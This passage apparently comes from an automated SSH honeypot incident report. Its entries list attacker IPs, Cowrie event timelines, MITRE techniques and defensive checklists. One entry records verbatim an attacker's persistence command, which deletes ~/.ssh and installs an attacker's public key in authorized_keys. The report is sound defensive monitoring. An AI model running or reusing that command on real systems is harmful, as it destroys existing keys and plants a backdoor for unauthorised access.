| `2026-08-04 16:17:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12abc26aab79

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:19 |
| **Last Seen** | 2026-08-04 16:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:19:48` | `cowrie.session.connect` |
| `2026-08-04 16:19:48` | `cowrie.client.version` |
| `2026-08-04 16:19:48` | `cowrie.client.kex` |
| `2026-08-04 16:19:48` | `cowrie.login.success` |
| `2026-08-04 16:19:49` | `cowrie.session.params` |
| `2026-08-04 16:19:49` | `cowrie.command.input` |
| `2026-08-04 16:19:49` | `cowrie.log.closed` |
| `2026-08-04 16:19:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85367fe529ee

| Field | Detail |
|---|---|
| **Source IP** | `65.20.131[.]63` |
| **First Seen** | 2026-08-04 16:20 |
| **Last Seen** | 2026-08-04 16:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:20:19` | `cowrie.session.connect` |
| `2026-08-04 16:20:19` | `cowrie.client.version` |
| `2026-08-04 16:20:19` | `cowrie.client.kex` |
| `2026-08-04 16:20:20` | `cowrie.login.success` |
| `2026-08-04 16:20:21` | `cowrie.direct-tcpip.request` |
| `2026-08-04 16:20:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.131[.]63` to AbuseIPDB if not already reported
- [ ] Block `65.20.131[.]63` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-321e71876926

| Field | Detail |
|---|---|
| **Source IP** | `64.89.162[.]146` |
| **First Seen** | 2026-08-04 16:20 |
| **Last Seen** | 2026-08-04 16:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:20:35` | `cowrie.session.connect` |
| `2026-08-04 16:20:35` | `cowrie.login.success` |
| `2026-08-04 16:20:35` | `cowrie.session.params` |
| `2026-08-04 16:20:35` | `cowrie.command.input` |
| `2026-08-04 16:20:35` | `cowrie.log.closed` |
| `2026-08-04 16:20:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.162[.]146` to AbuseIPDB if not already reported
- [ ] Block `64.89.162[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f1361a9ba68

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:21 |
| **Last Seen** | 2026-08-04 16:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:21:38` | `cowrie.session.connect` |
| `2026-08-04 16:21:38` | `cowrie.client.version` |
| `2026-08-04 16:21:38` | `cowrie.client.kex` |
| `2026-08-04 16:21:38` | `cowrie.login.success` |
| `2026-08-04 16:21:39` | `cowrie.session.params` |
| `2026-08-04 16:21:39` | `cowrie.command.input` |
| `2026-08-04 16:21:39` | `cowrie.log.closed` |
| `2026-08-04 16:21:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-765b87cb9129

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:23 |
| **Last Seen** | 2026-08-04 16:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:23:26` | `cowrie.session.connect` |
| `2026-08-04 16:23:26` | `cowrie.client.version` |
| `2026-08-04 16:23:26` | `cowrie.client.kex` |
| `2026-08-04 16:23:26` | `cowrie.login.success` |
| `2026-08-04 16:23:27` | `cowrie.session.params` |
| `2026-08-04 16:23:27` | `cowrie.command.input` |
| `2026-08-04 16:23:27` | `cowrie.log.closed` |
| `2026-08-04 16:23:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-688c7ea96ebc

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:25 |
| **Last Seen** | 2026-08-04 16:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:25:18` | `cowrie.session.connect` |
| `2026-08-04 16:25:18` | `cowrie.client.version` |
| `2026-08-04 16:25:18` | `cowrie.client.kex` |
| `2026-08-04 16:25:19` | `cowrie.login.success` |
| `2026-08-04 16:25:20` | `cowrie.session.params` |
| `2026-08-04 16:25:20` | `cowrie.command.input` |
| `2026-08-04 16:25:20` | `cowrie.log.closed` |
| `2026-08-04 16:25:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b21e23c81b9

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:27 |
| **Last Seen** | 2026-08-04 16:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:27:10` | `cowrie.session.connect` |
| `2026-08-04 16:27:10` | `cowrie.client.version` |
| `2026-08-04 16:27:10` | `cowrie.client.kex` |
| `2026-08-04 16:27:10` | `cowrie.login.success` |
| `2026-08-04 16:27:11` | `cowrie.session.params` |
| `2026-08-04 16:27:11` | `cowrie.command.input` |
| `2026-08-04 16:27:11` | `cowrie.log.closed` |
| `2026-08-04 16:27:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fd45dd6c112

| Field | Detail |
|---|---|
| **Source IP** | `101.13.1[.]58` |
| **First Seen** | 2026-08-04 16:28 |
| **Last Seen** | 2026-08-04 16:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:28:25` | `cowrie.session.connect` |
| `2026-08-04 16:28:26` | `cowrie.client.version` |
| `2026-08-04 16:28:26` | `cowrie.client.kex` |
| `2026-08-04 16:28:28` | `cowrie.login.success` |
| `2026-08-04 16:28:29` | `cowrie.direct-tcpip.request` |
| `2026-08-04 16:28:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.1[.]58` to AbuseIPDB if not already reported
- [ ] Block `101.13.1[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d0b0c1c76bf

| Field | Detail |
|---|---|
| **Source IP** | `218.15.224[.]102` |
| **First Seen** | 2026-08-04 16:28 |
| **Last Seen** | 2026-08-04 16:28 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:28:39` | `cowrie.session.connect` |
| `2026-08-04 16:28:40` | `cowrie.client.version` |
| `2026-08-04 16:28:40` | `cowrie.client.kex` |
| `2026-08-04 16:28:43` | `cowrie.login.success` |
| `2026-08-04 16:28:45` | `cowrie.direct-tcpip.request` |
| `2026-08-04 16:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.15.224[.]102` to AbuseIPDB if not already reported
- [ ] Block `218.15.224[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8166b8c0413

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:28 |
| **Last Seen** | 2026-08-04 16:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:28:59` | `cowrie.session.connect` |
| `2026-08-04 16:28:59` | `cowrie.client.version` |
| `2026-08-04 16:29:00` | `cowrie.client.kex` |
| `2026-08-04 16:29:00` | `cowrie.login.success` |
| `2026-08-04 16:29:00` | `cowrie.session.params` |
| `2026-08-04 16:29:00` | `cowrie.command.input` |
| `2026-08-04 16:29:01` | `cowrie.log.closed` |
| `2026-08-04 16:29:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8923d93b8dff

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:30 |
| **Last Seen** | 2026-08-04 16:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:30:54` | `cowrie.session.connect` |
| `2026-08-04 16:30:54` | `cowrie.client.version` |
| `2026-08-04 16:30:54` | `cowrie.client.kex` |
| `2026-08-04 16:30:54` | `cowrie.login.success` |
| `2026-08-04 16:30:55` | `cowrie.session.params` |
| `2026-08-04 16:30:55` | `cowrie.command.input` |
| `2026-08-04 16:30:55` | `cowrie.log.closed` |
| `2026-08-04 16:30:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26a6ad4d76f9

| Field | Detail |
|---|---|
| **Source IP** | `64.89.162[.]146` |
| **First Seen** | 2026-08-04 16:30 |
| **Last Seen** | 2026-08-04 16:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:30:59` | `cowrie.session.connect` |
| `2026-08-04 16:30:59` | `cowrie.client.version` |
| `2026-08-04 16:30:59` | `cowrie.client.kex` |
| `2026-08-04 16:31:00` | `cowrie.login.success` |
| `2026-08-04 16:31:00` | `cowrie.direct-tcpip.request` |
| `2026-08-04 16:31:00` | `cowrie.direct-tcpip.data` |
| `2026-08-04 16:31:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.162[.]146` to AbuseIPDB if not already reported
- [ ] Block `64.89.162[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f0ef63a40e3

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]42` |
| **First Seen** | 2026-08-04 16:31 |
| **Last Seen** | 2026-08-04 16:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:31:17` | `cowrie.session.connect` |
| `2026-08-04 16:31:17` | `cowrie.client.version` |
| `2026-08-04 16:31:17` | `cowrie.client.kex` |
| `2026-08-04 16:31:17` | `cowrie.login.success` |
| `2026-08-04 16:31:18` | `cowrie.direct-tcpip.request` |
| `2026-08-04 16:31:18` | `cowrie.direct-tcpip.data` |
| `2026-08-04 16:31:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]42` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4ae5523b01e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:32 |
| **Last Seen** | 2026-08-04 16:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:32:48` | `cowrie.session.connect` |
| `2026-08-04 16:32:48` | `cowrie.client.version` |
| `2026-08-04 16:32:48` | `cowrie.client.kex` |
| `2026-08-04 16:32:49` | `cowrie.login.success` |
| `2026-08-04 16:32:50` | `cowrie.session.params` |
| `2026-08-04 16:32:50` | `cowrie.command.input` |
| `2026-08-04 16:32:50` | `cowrie.log.closed` |
| `2026-08-04 16:32:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a726c07b74d

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]224` |
| **First Seen** | 2026-08-04 16:32 |
| **Last Seen** | 2026-08-04 16:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:32:50` | `cowrie.session.connect` |
| `2026-08-04 16:32:50` | `cowrie.client.version` |
| `2026-08-04 16:32:50` | `cowrie.client.kex` |
| `2026-08-04 16:32:51` | `cowrie.login.success` |
| `2026-08-04 16:32:51` | `cowrie.direct-tcpip.request` |
| `2026-08-04 16:32:51` | `cowrie.direct-tcpip.data` |
| `2026-08-04 16:32:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]224` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]224` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bf4791908d9

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]53` |
| **First Seen** | 2026-08-04 16:32 |
| **Last Seen** | 2026-08-04 16:33 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:32:58` | `cowrie.session.connect` |
| `2026-08-04 16:32:58` | `cowrie.client.version` |
| `2026-08-04 16:32:58` | `cowrie.client.kex` |
| `2026-08-04 16:33:03` | `cowrie.login.success` |
| `2026-08-04 16:33:04` | `cowrie.direct-tcpip.request` |
| `2026-08-04 16:33:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]53` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f28d84a429aa

| Field | Detail |
|---|---|
| **Source IP** | `43.165.170[.]198` |
| **First Seen** | 2026-08-04 16:33 |
| **Last Seen** | 2026-08-04 16:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:33:35` | `cowrie.session.connect` |
| `2026-08-04 16:33:35` | `cowrie.client.version` |
| `2026-08-04 16:33:35` | `cowrie.client.kex` |
| `2026-08-04 16:33:36` | `cowrie.login.success` |
| `2026-08-04 16:33:37` | `cowrie.session.params` |
| `2026-08-04 16:33:37` | `cowrie.command.input` |
| `2026-08-04 16:33:37` | `cowrie.command.failed` |
| `2026-08-04 16:33:37` | `cowrie.log.closed` |
| `2026-08-04 16:33:38` | `cowrie.session.params` |
| `2026-08-04 16:33:38` | `cowrie.command.input` |
| `2026-08-04 16:33:38` | `cowrie.session.file_download` |
| `2026-08-04 16:33:38` | `cowrie.log.closed` |
| `2026-08-04 16:33:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.170[.]198` to AbuseIPDB if not already reported
- [ ] Block `43.165.170[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14a0574e9884

| Field | Detail |
|---|---|
| **Source IP** | `43.165.170[.]198` |
| **First Seen** | 2026-08-04 16:33 |
| **Last Seen** | 2026-08-04 16:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:33:38` | `cowrie.session.connect` |
| `2026-08-04 16:33:38` | `cowrie.client.version` |
| `2026-08-04 16:33:38` | `cowrie.client.kex` |
| `2026-08-04 16:33:39` | `cowrie.login.success` |
| `2026-08-04 16:33:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.170[.]198` to AbuseIPDB if not already reported
- [ ] Block `43.165.170[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc3095cb85b1

| Field | Detail |
|---|---|
| **Source IP** | `43.165.170[.]198` |
| **First Seen** | 2026-08-04 16:33 |
| **Last Seen** | 2026-08-04 16:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:33:39` | `cowrie.session.connect` |
| `2026-08-04 16:33:39` | `cowrie.client.version` |
| `2026-08-04 16:33:39` | `cowrie.client.kex` |
| `2026-08-04 16:33:40` | `cowrie.login.success` |
| `2026-08-04 16:33:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.170[.]198` to AbuseIPDB if not already reported
- [ ] Block `43.165.170[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03567bc5855f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:34 |
| **Last Seen** | 2026-08-04 16:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:34:38` | `cowrie.session.connect` |
| `2026-08-04 16:34:38` | `cowrie.client.version` |
| `2026-08-04 16:34:38` | `cowrie.client.kex` |
| `2026-08-04 16:34:38` | `cowrie.login.success` |
| `2026-08-04 16:34:39` | `cowrie.session.params` |
| `2026-08-04 16:34:39` | `cowrie.command.input` |
| `2026-08-04 16:34:39` | `cowrie.log.closed` |
| `2026-08-04 16:34:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7043a7272e18

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:36 |
| **Last Seen** | 2026-08-04 16:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:36:26` | `cowrie.session.connect` |
| `2026-08-04 16:36:26` | `cowrie.client.version` |
| `2026-08-04 16:36:26` | `cowrie.client.kex` |
| `2026-08-04 16:36:26` | `cowrie.login.success` |
| `2026-08-04 16:36:27` | `cowrie.session.params` |
| `2026-08-04 16:36:27` | `cowrie.command.input` |
| `2026-08-04 16:36:27` | `cowrie.log.closed` |
| `2026-08-04 16:36:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f95c71de390f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:38 |
| **Last Seen** | 2026-08-04 16:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:38:18` | `cowrie.session.connect` |
| `2026-08-04 16:38:18` | `cowrie.client.version` |
| `2026-08-04 16:38:18` | `cowrie.client.kex` |
| `2026-08-04 16:38:18` | `cowrie.login.success` |
| `2026-08-04 16:38:19` | `cowrie.session.params` |
| `2026-08-04 16:38:19` | `cowrie.command.input` |
| `2026-08-04 16:38:19` | `cowrie.log.closed` |
| `2026-08-04 16:38:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df3f5d8edcf9

| Field | Detail |
|---|---|
| **Source IP** | `117.216.33[.]31` |
| **First Seen** | 2026-08-04 16:38 |
| **Last Seen** | 2026-08-04 16:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:38:41` | `cowrie.session.connect` |
| `2026-08-04 16:38:41` | `cowrie.client.version` |
| `2026-08-04 16:38:41` | `cowrie.client.kex` |
| `2026-08-04 16:38:44` | `cowrie.login.success` |
| `2026-08-04 16:38:45` | `cowrie.direct-tcpip.request` |
| `2026-08-04 16:38:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.216.33[.]31` to AbuseIPDB if not already reported
- [ ] Block `117.216.33[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f54a5f7f0b25

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:40 |
| **Last Seen** | 2026-08-04 16:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:40:08` | `cowrie.session.connect` |
| `2026-08-04 16:40:08` | `cowrie.client.version` |
| `2026-08-04 16:40:08` | `cowrie.client.kex` |
| `2026-08-04 16:40:08` | `cowrie.login.success` |
| `2026-08-04 16:40:09` | `cowrie.session.params` |
| `2026-08-04 16:40:09` | `cowrie.command.input` |
| `2026-08-04 16:40:09` | `cowrie.log.closed` |
| `2026-08-04 16:40:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81cbed208dfa

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:41 |
| **Last Seen** | 2026-08-04 16:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:41:56` | `cowrie.session.connect` |
| `2026-08-04 16:41:56` | `cowrie.client.version` |
